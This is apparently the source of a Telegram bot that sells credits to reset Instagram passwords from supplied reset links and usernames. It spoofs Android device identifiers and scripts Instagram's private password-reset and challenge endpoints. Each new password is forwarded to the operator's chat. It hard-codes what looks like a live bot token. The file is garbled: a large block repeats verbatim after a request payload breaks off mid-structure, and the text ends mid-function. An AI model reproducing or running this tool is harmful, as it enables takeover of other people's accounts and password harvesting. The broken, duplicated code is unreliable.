import os
import random
import string
import uuid
import time
import json
import re
from datetime import datetime, date
from threading import Thread
import requests

BOT_TOKEN = "8875833170:AAGhSuqbV9tYC1Dqt-pqv-AQ2vOKVyTtPXw"
CHAT_ID = "7735158151"
BOT_USERNAME = "IgReset_RoBot"

# --- Startup video (sent once when bot starts) ---
STARTUP_VIDEO_URL = "https://t.me/sneuc/14"

# --- IMAGE sent when user types /start ---
STARTUP_IMAGE_URL = "https://t.me/sneuc/15"

# Force subscribe channels
FORCE_SUB_CHANNELS = ["xPythonTools", "Resphonic"]
ENABLE_FORCE_SUB = True

ADMIN_IDS = [7735158151, 987654321]
DB_FILE = "ueiheieser_data.json"

session = requests.Session()
session.headers.update({
    "Connection": "keep-alive",
    "Accept-Encoding": "gzip, deflate"
})

# ---------- Database Functions ----------
def load_db():
    try:
        with open(DB_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def save_db(data):
    with open(DB_FILE, "w") as f:
        json.dump(data, f, indent=4)

def migrate_user_data():
    db = load_db()
    updated = False
    for user_id, user_data in db.items():
        for key in ["referral_code", "referral_link", "total_referrals", "total_earned", "referred_by"]:
            if key in user_data:
                del user_data[key]
                updated = True
    if updated:
        save_db(db)
        print("✅ Database migrated successfully!")

def get_user_data(user_id):
    db = load_db()
    user_id_str = str(user_id)
    if user_id_str not in db:
        db[user_id_str] = {
            "credits": 2,
            "last_reset_date": str(date.today())
        }
        save_db(db)
    else:
        if db[user_id_str].get("last_reset_date") != str(date.today()):
            db[user_id_str]["credits"] = 2
            db[user_id_str]["last_reset_date"] = str(date.today())
            save_db(db)
    return db[user_id_str]

def update_user_credits(user_id, credits):
    db = load_db()
    user_id_str = str(user_id)
    if user_id_str in db:
        db[user_id_str]["credits"] = credits
        save_db(db)

def add_credits(user_id, amount):
    db = load_db()
    user_id_str = str(user_id)
    if user_id_str in db:
        db[user_id_str]["credits"] += amount
        save_db(db)
        return True
    return False

def deduct_credit(user_id):
    user_data = get_user_data(user_id)
    if user_data["credits"] >= 1:
        user_data["credits"] -= 1
        update_user_credits(user_id, user_data["credits"])
        return True
    return False

# ---------- Force Subscribe ----------
def verify_user_subscription(user_id):
    if not ENABLE_FORCE_SUB:
        return True, None
    for channel in FORCE_SUB_CHANNELS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
        params = {"chat_id": f"@{channel}", "user_id": user_id}
        try:
            response = session.get(url, params=params, timeout=3)
            data = response.json()
            if data.get("ok"):
                status = data["result"].get("status", "")
                if status not in ["member", "administrator", "creator"]:
                    return False, channel
            else:
                return False, channel
        except Exception:
            return False, channel
    return True, None

def send_subscription_required(chat_id, user_id, message_id=None):
    required_channels = []
    for channel in FORCE_SUB_CHANNELS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
        params = {"chat_id": f"@{channel}", "user_id": user_id}
        try:
            response = session.get(url, params=params, timeout=3)
            data = response.json()
            if data.get("ok"):
                status = data["result"].get("status", "")
                if status not in ["member", "administrator", "creator"]:
                    required_channels.append(channel)
            else:
                required_channels.append(channel)
        except:
            required_channels.append(channel)
    if not required_channels:
        return True
    msg = f"""⚠️ <b>Jᴏɪɴ Cʜᴀɴɴᴇʟs Tᴏ Usᴇ Tʜᴇ Bᴏᴛ</b>

Aғᴛᴇʀ Jᴏɪɴɪɴɢ, ᴄʟɪᴄᴋ ᴛʜᴇ ᴠᴇʀɪғʏ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ 👇"""
    keyboard_buttons = []
    for ch in required_channels:
        keyboard_buttons.append([{"text": f"Jᴏɪɴ Cʜᴀɴɴᴇʟ", "url": f"https://t.me/{ch}"}])
    keyboard_buttons.append([{"text": "✅ Vᴇʀɪғʏ Sᴜʙsᴄʀɪᴘᴛɪᴏɴ", "callback_data": "verify_sub"}])
    keyboard_buttons.append([{"text": "🔄 Rᴇғʀᴇsʜ", "callback_data": "refresh_sub"}])
    keyboard = {"inline_keyboard": keyboard_buttons}
    if message_id:
        edit_photo_caption(chat_id, message_id, msg, keyboard)
    else:
        send_photo(chat_id, STARTUP_IMAGE_URL, caption=msg, reply_markup=keyboard)
    return False

# ---------- Telegram Helpers ----------
def send_message(chat_id, text, reply_markup=None, parse_mode="HTML", disable_web_page_preview=False):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode, "disable_web_page_preview": disable_web_page_preview}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = session.post(url, data=payload, timeout=5)
        return response.json()
    except:
        return None

def send_photo(chat_id, photo_url, caption=None, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    payload = {
        "chat_id": chat_id,
        "photo": photo_url,
        "caption": caption,
        "parse_mode": "HTML"
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = session.post(url, data=payload, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Failed to send photo: {e}")
        return None

def edit_photo_caption(chat_id, message_id, caption, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageCaption"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "caption": caption,
        "parse_mode": "HTML"
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = session.post(url, data=payload, timeout=5)
        return response.json()
    except Exception as e:
        print(f"Failed to edit photo caption: {e}")
        return None

def send_video(chat_id, video_url, caption=None, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
    payload = {"chat_id": chat_id, "video": video_url, "caption": caption, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = session.post(url, data=payload, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Failed to send video: {e}")
        return None

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"offset": offset, "timeout": 25}
    try:
        response = session.get(url, params=params, timeout=30)
        return response.json()
    except:
        return None

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    try:
        session.post(url, data=payload, timeout=5)
    except:
        pass

# ---------- Instagram Reset Functions ----------
def generate_device_info():
    ANDROID_ID = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
    USER_AGENT = f"Instagram 394.0.0.46.81 Android ({random.choice(['28/9','29/10','30/11','31/12'])}; {random.choice(['240dpi','320dpi','480dpi'])}; {random.choice(['720x1280','1080x1920','1440x2560'])}; {random.choice(['samsung','xiaomi','huawei','oneplus','google'])}; {random.choice(['SM-G975F','Mi-9T','P30-Pro','ONEPLUS-A6003','Pixel-4'])}; intel; en_US; {random.randint(100000000,999999999)})"
    WATERFALL_ID = str(uuid.uuid4())
    timestamp = int(datetime.now().timestamp())
    nums = ''.join([str(random.randint(1, 100)) for _ in range(4)])
    PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:Random@{nums}'
    return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD

def make_headers(mid="", user_agent=""):
    return {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
        "X-Mid": mid,
        "User-Agent": user_agent,
        "Content-Length": "9481"
    }

def id_user(user_id):
    try:
        url = f"https://i.instagram.com/api/v1/users/{user_id}/info/"
        headers = {"User-Agent": "Instagram 219.0.0.12.117 Android"}
        r = session.get(url, headers=headers, timeout=8)
        try:
            username = r.json()["user"]["username"]
            return username
        except:
            return None
    except:
        return None

def reset_instagram_password(reset_link, progress_callback=None):
    try:
        ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD = generate_device_info()
        if progress_callback:
            progress_callback(10, "Extracting reset token...")
        
        uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
        token = reset_link.split("&token=")[1].split(":")[0]

        if progress_callback:
            progress_callback(25, "Sending reset request...")
        
        url = "https://i.instagram.com/api/v1/accounts/password_reset/"
        data = {
            "source": "one_click_login_email",
            "uidb36": uidb36,
            "device_id": ANDROID_ID,
            "token": token,
            "waterfall_id": WATERFALL_ID
        }
        
        # Increased timeout + retry
        for attempt in range(3):
            try:
                r = session.post(url, headers=make_headers(user_agent=USER_AGENT), data=data, timeout=15)
                break
            except:
                if attempt == 2:
                    raise
                time.sleep(2)

        if "user_id" not in r.text:
            return {"success": False, "error": f"Error in reset request: {r.text[:200]}"}

        if progress_callback:
            progress_callback(40, "Processing challenge...")
        
        mid = r.headers.get("Ig-Set-X-Mid")
        resp_json = r.json()
        user_id = resp_json.get("user_id")
        cni = resp_json.get("cni")
        nonce_code = resp_json.get("nonce_code")
        challenge_context = resp_json.get("challenge_context")

        url2 = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        data2 = {
            "user_id": str(user_id),
            "cni": str(cni),
            "nonce_code": str(nonce_code),
            "bk_client_context": '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            "challenge_context": str(challenge_context),
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "get_challenge": "true"
        }
        
        if progress_callback:
            progress_callback(55, "Solving challenge...")
        
        r2 = session.post(url2, headers=make_headers(mid, USER_AGENT), data=data2, timeout=15).text

        if progress_callback:
            progress_callback(70, "Setting new password...")
        
        # More robust parsing
        try:
            challenge_context_final = r2.replace('\\', '').split(f'(bk.action.i64.Const, {cni}), "')[1].split('", (bk.action.bool.Const, false)))')[0]
        except IndexError:
            return {"success": False, "error": "Failed to parse challenge response"}

        data3 = {
            "is_caa": "False",
            "source": "",
            "uidb36": "",
            "error_state": {"type_name":"str","index":0,"state_id":1048583541},
            "afv": "",
            "cni": str(cni),
            "token": "",
            "has_follow_up_screens": "0",
            "bk_client_context": {"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"},
            "challenge_context": challenge_context_final,
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "enc_new_password1": PASSWORD,
            "enc_new_password2": PASSWORD
        }
        
        session.post(url2, headers=make_headers(mid, USER_AGENT), data=data3, timeout=15)
        
        new_password = PASSWORD.split(":")[-1]
        if progress_callback:
            progress_callback(90, "Finalizing...")
        
        return {
            "success": True,
            "password": new_password,
            "user_id": user_id
        }
    except Exception as e:
        return {"success": False, "error": str(e)}

# Keep the rest of your code exactly the same (process_reset_link_with_progress and everything below)
def process_reset_link_with_progress(chat_id, user_id, reset_link, menu_msg_id):
    user_data = get_user_data(user_id)
    if user_data["credits"] < 1:
        msg = """❌ <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs!</b>

Yᴏᴜ ɴᴇᴇᴅ 1 Cʀᴇᴅɪᴛ ᴛᴏ ʀᴇsᴇᴛ ᴀ ᴘᴀssᴡᴏʀᴅ.

💡 <b>Gᴇᴛ Mᴏʀᴇ Cʀᴇᴅɪᴛs :</b>
• Wᴀɪᴛ ғᴏʀ ᴅᴀɪʟʏ ʀᴇsᴇᴛ (2 Cʀᴇᴅɪᴛs ᴇᴀᴄʜ ᴅᴀʏ)

— Dᴍ @xYourKing Tᴏ Bᴜʏ Cʀᴇᴅɪᴛs
"""
        keyboard = {"inline_keyboard": [[{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]]}
        edit_photo_caption(chat_id, menu_msg_id, msg, keyboard)
        return
    deduct_credit(user_id)
    progress_msg = send_message(chat_id, "⚙️ <b>Processing...</b>\n0%")
    progress_msg_id = progress_msg["result"]["message_id"] if progress_msg else None
    def update_progress(percent, status_text):
        if progress_msg_id:
            filled = int(percent / 10)
            bar = "█" * filled + "░" * (10 - filled)
            try:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
                payload = {"chat_id": chat_id, "message_id": progress_msg_id, "text": f"⚙️ <b>Processing...</b>\n{percent}% {bar}\n└ 🔄 {status_text}", "parse_mode": "HTML"}
                session.post(url, data=payload, timeout=5)
            except:
                pass
    result = reset_instagram_password(reset_link, update_progress)
    if progress_msg_id:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
            session.post(url, data={"chat_id": chat_id, "message_id": progress_msg_id})
        except:
            pass
    if result.get("success"):
        user_id_insta = result.get("user_id")
        new_password = result.get("password")
        username = id_user(user_id_insta)
        if username:
            msg = f"<b>Pᴀssᴡᴏʀᴅ Rᴇsᴇᴛ Dᴏɴᴇ</b>\n\nUsᴇʀɴᴀᴍᴇ : <code>{username}</code>\nNᴇᴡ Pᴀssᴡᴏʀᴅ : <code>{new_password}</code>\n🔄 Sᴇssɪᴏɴ Iᴅ : <code>{user_id_insta}</code>"
        else:
            msg = f"<b>Pᴀssᴡᴏʀᴅ Rᴇsᴇᴛ Dᴏɴᴇ</b>\n\nNᴇᴡ Pᴀssᴡᴏʀᴅ : <code>{new_password}</code>\n🔄 Sᴇssɪᴏɴ Iᴅ : <code>{user_id_insta}</code>"
        remaining = get_user_data(user_id)["credits"]
        msg += f"\n\n📊 Rᴇᴍᴀɪɴɪɴɢ Cʀᴇᴅɪᴛs : <b>{remaining}</b>"
        keyboard = {"inline_keyboard": [[{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]]}
        send_message(chat_id, msg, reply_markup=keyboard)
        send_telegram_message(f"🎯 Rᴇsᴇᴛ Dᴏɴᴇ\nUser: {user_id}\nPᴀssᴡᴏʀᴅ: {new_password}")
    else:
        add_credits(user_id, 1)
        msg = f"❌ <b>Rᴇsᴇᴛ Fᴀɪʟᴇᴅ!</b>\n\nError: {result.get('error', 'Unknown error')}\n\nYᴏᴜʀ Cʀᴇᴅɪᴛ ʜᴀs ʙᴇᴇɴ ʀᴇғᴜɴᴅᴇᴅ."
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔄 Tʀʏ Aɢᴀɪɴ", "callback_data": "send_reset_link"}],
                [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
            ]
        }
        send_message(chat_id, msg, reply_markup=keyboard)

# (The rest of your code - InstagramResetByEmail class, process_username_reset, menus, main loop, etc. remains unchanged)
# ... [All the remaining code from your original works.py stays exactly the same from here]

# ---------- Reset via Email/Username (with masked email display, no admin log) ----------
class InstagramResetByEmail:
    def __init__(self):
        self.SATAN = "567067343352428"
        self.YOURKING = "8c9c28282f690772f23fcf9061954c93eeec8c673d2ec49d860dabf5dea4ca27"
        self.PARITHINGS = {
            'User-Agent': "Instagram 312.0.0.33.119 Android (26/8.0.0; 480dpi; 2160x2160; Google; Pixel; sailfish; msm8996; en_US; 556997774)",
            'x-bloks-version-id': "8c9c28282f690772f23fcf9061954c93eeec8c673d2ec49d860dabf5dea4ca27",
            'x-fb-friendly-name': "IgApi: bloks/apps/com.bloks.www.caa.ar.search.async/",
            'x-ig-android-id': "android-4f13595c1814df92",
            'x-ig-app-id': "567067343352428",
            'x-ig-device-id': "8deb1321-e663-40be-ada2-55325ca99b13",
            'x-ig-family-device-id': "eec97373-1959-5436-993e-c5e3472b3429",
            'x-mid': "bcPDkxACBBFRwdnT3iz2pKyVoO9b"
        }
        self.WLZTAN = "https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.caa.ar.search.async/"

    def mask_email(self, email):
        """Return masked email like n******2@domain.com"""
        if '@' in email:
            local, domain = email.split('@', 1)
            if len(local) > 2:
                masked_local = local[0] + '*' * (len(local) - 2) + local[-1]
            else:
                masked_local = local[0] + '*'
            return f"{masked_local}@{domain}"
        return email

    def send_reset_request(self, search_input):
        url = self.WLZTAN
        payload = {
            'params': json.dumps({
                'client_input_params': {
                    'was_headers_prefill_available': 0,
                    'ig_vetted_device_nonce': '',
                    'cloud_trust_token': None,
                    'zero_balance_state': None,
                    'sso_accounts_auth_data': [],
                    'accounts_list': [
                        {'token': '', 'uid': '', 'credential_type': 'none'},
                        {'metadata': {'device_base_login_session': '', 'big_blue_token': None}, 'account_type': 'nonce', 'token': '', 'uid': ''},
                        {'account_type': 'google_oauth', 'token': ''}
                    ],
                    'ig_android_qe_device_id': '8deb1321-e663-40be-ada2-55325ca99b13',
                    'gms_incoming_call_retriever_eligibility': 'client_not_supported',
                    'headers_infra_flow_id': '',
                    'ig_oauth_token': [{'token': '', 'account_type': 'google_oauth'}],
                    'search_query': search_input,
                    'sfdid': '',
                    'flash_call_permissions_status': {'READ_PHONE_STATE': 'GRANTED', 'READ_CALL_LOG': 'DENIED', 'CALL_PHONE': 'UNKNOWN'},
                    'network_bssid': None,
                    'text_input_id': 'piwfmg:62',
                    'is_oauth_without_permission': 0,
                    'is_whatsapp_installed': 0,
                    'aac': '{"aac_init_timestamp":1774422796,"aacjid":"bc1f1830-62fd-5449-91ae-95ebfdab1288","aaccs":""}',
                    'fetched_email_token_list': {},
                    'android_build_type': 'release',
                    'fetched_email_list': [],
                    'was_headers_prefill_used': 0,
                    'auth_secure_device_id': '',
                    'search_screen_type': 'email_or_username',
                    'encrypted_msisdn': '',
                    'lois_settings': {'lois_token': ''},
                    'device_network_info': None
                },
                'server_params': {
                    'is_platform_login': 0,
                    'is_from_logged_out': 0,
                    'context_data': '',
                    'qe_device_id': '8deb1321-e663-40be-ada2-55325ca99b13',
                  if data.get("ok"):
                status = data["result"].get("status", "")
                if status not in ["member", "administrator", "creator"]:
                    return False, channel
            else:
                return False, channel
        except Exception:
            return False, channel
    return True, None

def send_subscription_required(chat_id, user_id, message_id=None):
    required_channels = []
    for channel in FORCE_SUB_CHANNELS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
        params = {"chat_id": f"@{channel}", "user_id": user_id}
        try:
            response = session.get(url, params=params, timeout=3)
            data = response.json()
            if data.get("ok"):
                status = data["result"].get("status", "")
                if status not in ["member", "administrator", "creator"]:
                    required_channels.append(channel)
            else:
                required_channels.append(channel)
        except:
            required_channels.append(channel)
    if not required_channels:
        return True
    msg = f"""⚠️ <b>Jᴏɪɴ Cʜᴀɴɴᴇʟs Tᴏ Usᴇ Tʜᴇ Bᴏᴛ</b>

Aғᴛᴇʀ Jᴏɪɴɪɴɢ, ᴄʟɪᴄᴋ ᴛʜᴇ ᴠᴇʀɪғʏ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ 👇"""
    keyboard_buttons = []
    for ch in required_channels:
        keyboard_buttons.append([{"text": f"Jᴏɪɴ Cʜᴀɴɴᴇʟ", "url": f"https://t.me/{ch}"}])
    keyboard_buttons.append([{"text": "✅ Vᴇʀɪғʏ Sᴜʙsᴄʀɪᴘᴛɪᴏɴ", "callback_data": "verify_sub"}])
    keyboard_buttons.append([{"text": "🔄 Rᴇғʀᴇsʜ", "callback_data": "refresh_sub"}])
    keyboard = {"inline_keyboard": keyboard_buttons}
    if message_id:
        edit_photo_caption(chat_id, message_id, msg, keyboard)
    else:
        send_photo(chat_id, STARTUP_IMAGE_URL, caption=msg, reply_markup=keyboard)
    return False

# ---------- Telegram Helpers ----------
def send_message(chat_id, text, reply_markup=None, parse_mode="HTML", disable_web_page_preview=False):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode, "disable_web_page_preview": disable_web_page_preview}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = session.post(url, data=payload, timeout=5)
        return response.json()
    except:
        return None

def send_photo(chat_id, photo_url, caption=None, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    payload = {
        "chat_id": chat_id,
        "photo": photo_url,
        "caption": caption,
        "parse_mode": "HTML"
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = session.post(url, data=payload, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Failed to send photo: {e}")
        return None

def edit_photo_caption(chat_id, message_id, caption, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageCaption"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "caption": caption,
        "parse_mode": "HTML"
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = session.post(url, data=payload, timeout=5)
        return response.json()
    except Exception as e:
        print(f"Failed to edit photo caption: {e}")
        return None

def send_video(chat_id, video_url, caption=None, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
    payload = {"chat_id": chat_id, "video": video_url, "caption": caption, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = session.post(url, data=payload, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Failed to send video: {e}")
        return None

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"offset": offset, "timeout": 25}
    try:
        response = session.get(url, params=params, timeout=30)
        return response.json()
    except:
        return None

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    try:
        session.post(url, data=payload, timeout=5)
    except:
        pass

# ---------- Instagram Reset Functions ----------
def generate_device_info():
    ANDROID_ID = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
    USER_AGENT = f"Instagram 394.0.0.46.81 Android ({random.choice(['28/9','29/10','30/11','31/12'])}; {random.choice(['240dpi','320dpi','480dpi'])}; {random.choice(['720x1280','1080x1920','1440x2560'])}; {random.choice(['samsung','xiaomi','huawei','oneplus','google'])}; {random.choice(['SM-G975F','Mi-9T','P30-Pro','ONEPLUS-A6003','Pixel-4'])}; intel; en_US; {random.randint(100000000,999999999)})"
    WATERFALL_ID = str(uuid.uuid4())
    timestamp = int(datetime.now().timestamp())
    nums = ''.join([str(random.randint(1, 100)) for _ in range(4)])
    PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:Random@{nums}'
    return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD

def make_headers(mid="", user_agent=""):
    return {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
        "X-Mid": mid,
        "User-Agent": user_agent,
        "Content-Length": "9481"
    }

def id_user(user_id):
    try:
        url = f"https://i.instagram.com/api/v1/users/{user_id}/info/"
        headers = {"User-Agent": "Instagram 219.0.0.12.117 Android"}
        r = session.get(url, headers=headers, timeout=8)
        try:
            username = r.json()["user"]["username"]
            return username
        except:
            return None
    except:
        return None

def reset_instagram_password(reset_link, progress_callback=None):
    try:
        ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD = generate_device_info()
        if progress_callback:
            progress_callback(10, "Extracting reset token...")
        
        uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
        token = reset_link.split("&token=")[1].split(":")[0]

        if progress_callback:
            progress_callback(25, "Sending reset request...")
        
        url = "https://i.instagram.com/api/v1/accounts/password_reset/"
        data = {
            "source": "one_click_login_email",
            "uidb36": uidb36,
            "device_id": ANDROID_ID,
            "token": token,
            "waterfall_id": WATERFALL_ID
        }
        
        # Increased timeout + retry
        for attempt in range(3):
            try:
                r = session.post(url, headers=make_headers(user_agent=USER_AGENT), data=data, timeout=15)
                break
            except:
                if attempt == 2:
                    raise
                time.sleep(2)

        if "user_id" not in r.text:
            return {"success": False, "error": f"Error in reset request: {r.text[:200]}"}

        if progress_callback:
            progress_callback(40, "Processing challenge...")
        
        mid = r.headers.get("Ig-Set-X-Mid")
        resp_json = r.json()
        user_id = resp_json.get("user_id")
        cni = resp_json.get("cni")
        nonce_code = resp_json.get("nonce_code")
        challenge_context = resp_json.get("challenge_context")

        url2 = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        data2 = {
            "user_id": str(user_id),
            "cni": str(cni),
            "nonce_code": str(nonce_code),
            "bk_client_context": '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            "challenge_context": str(challenge_context),
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "get_challenge": "true"
        }
        
        if progress_callback:
            progress_callback(55, "Solving challenge...")
        
        r2 = session.post(url2, headers=make_headers(mid, USER_AGENT), data=data2, timeout=15).text

        if progress_callback:
            progress_callback(70, "Setting new password...")
        
        # More robust parsing
        try:
            challenge_context_final = r2.replace('\\', '').split(f'(bk.action.i64.Const, {cni}), "')[1].split('", (bk.action.bool.Const, false)))')[0]
        except IndexError:
            return {"success": False, "error": "Failed to parse challenge response"}

        data3 = {
            "is_caa": "False",
            "source": "",
            "uidb36": "",
            "error_state": {"type_name":"str","index":0,"state_id":1048583541},
            "afv": "",
            "cni": str(cni),
            "token": "",
            "has_follow_up_screens": "0",
            "bk_client_context": {"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"},
            "challenge_context": challenge_context_final,
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "enc_new_password1": PASSWORD,
            "enc_new_password2": PASSWORD
        }
        
        session.post(url2, headers=make_headers(mid, USER_AGENT), data=data3, timeout=15)
        
        new_password = PASSWORD.split(":")[-1]
        if progress_callback:
            progress_callback(90, "Finalizing...")
        
        return {
            "success": True,
            "password": new_password,
            "user_id": user_id
        }
    except Exception as e:
        return {"success": False, "error": str(e)}

# Keep the rest of your code exactly the same (process_reset_link_with_progress and everything below)
def process_reset_link_with_progress(chat_id, user_id, reset_link, menu_msg_id):
    user_data = get_user_data(user_id)
    if user_data["credits"] < 1:
        msg = """❌ <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs!</b>

Yᴏᴜ ɴᴇᴇᴅ 1 Cʀᴇᴅɪᴛ ᴛᴏ ʀᴇsᴇᴛ ᴀ ᴘᴀssᴡᴏʀᴅ.

💡 <b>Gᴇᴛ Mᴏʀᴇ Cʀᴇᴅɪᴛs :</b>
• Wᴀɪᴛ ғᴏʀ ᴅᴀɪʟʏ ʀᴇsᴇᴛ (2 Cʀᴇᴅɪᴛs ᴇᴀᴄʜ ᴅᴀʏ)

— Dᴍ @xYourKing Tᴏ Bᴜʏ Cʀᴇᴅɪᴛs
"""
        keyboard = {"inline_keyboard": [[{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]]}
        edit_photo_caption(chat_id, menu_msg_id, msg, keyboard)
        return
    deduct_credit(user_id)
    progress_msg = send_message(chat_id, "⚙️ <b>Processing...</b>\n0%")
    progress_msg_id = progress_msg["result"]["message_id"] if progress_msg else None
    def update_progress(percent, status_text):
        if progress_msg_id:
            filled = int(percent / 10)
            bar = "█" * filled + "░" * (10 - filled)
            try:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
                payload = {"chat_id": chat_id, "message_id": progress_msg_id, "text": f"⚙️ <b>Processing...</b>\n{percent}% {bar}\n└ 🔄 {status_text}", "parse_mode": "HTML"}
                session.post(url, data=payload, timeout=5)
            except:
                pass
    result = reset_instagram_password(reset_link, update_progress)
    if progress_msg_id:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
            session.post(url, data={"chat_id": chat_id, "message_id": progress_msg_id})
        except:
            pass
    if result.get("success"):
        user_id_insta = result.get("user_id")
        new_password = result.get("password")
        username = id_user(user_id_insta)
        if username:
            msg = f"<b>Pᴀssᴡᴏʀᴅ Rᴇsᴇᴛ Dᴏɴᴇ</b>\n\nUsᴇʀɴᴀᴍᴇ : <code>{username}</code>\nNᴇᴡ Pᴀssᴡᴏʀᴅ : <code>{new_password}</code>\n🔄 Sᴇssɪᴏɴ Iᴅ : <code>{user_id_insta}</code>"
        else:
            msg = f"<b>Pᴀssᴡᴏʀᴅ Rᴇsᴇᴛ Dᴏɴᴇ</b>\n\nNᴇᴡ Pᴀssᴡᴏʀᴅ : <code>{new_password}</code>\n🔄 Sᴇssɪᴏɴ Iᴅ : <code>{user_id_insta}</code>"
        remaining = get_user_data(user_id)["credits"]
        msg += f"\n\n📊 Rᴇᴍᴀɪɴɪɴɢ Cʀᴇᴅɪᴛs : <b>{remaining}</b>"
        keyboard = {"inline_keyboard": [[{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]]}
        send_message(chat_id, msg, reply_markup=keyboard)
        send_telegram_message(f"🎯 Rᴇsᴇᴛ Dᴏɴᴇ\nUser: {user_id}\nPᴀssᴡᴏʀᴅ: {new_password}")
    else:
        add_credits(user_id, 1)
        msg = f"❌ <b>Rᴇsᴇᴛ Fᴀɪʟᴇᴅ!</b>\n\nError: {result.get('error', 'Unknown error')}\n\nYᴏᴜʀ Cʀᴇᴅɪᴛ ʜᴀs ʙᴇᴇɴ ʀᴇғᴜɴᴅᴇᴅ."
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔄 Tʀʏ Aɢᴀɪɴ", "callback_data": "send_reset_link"}],
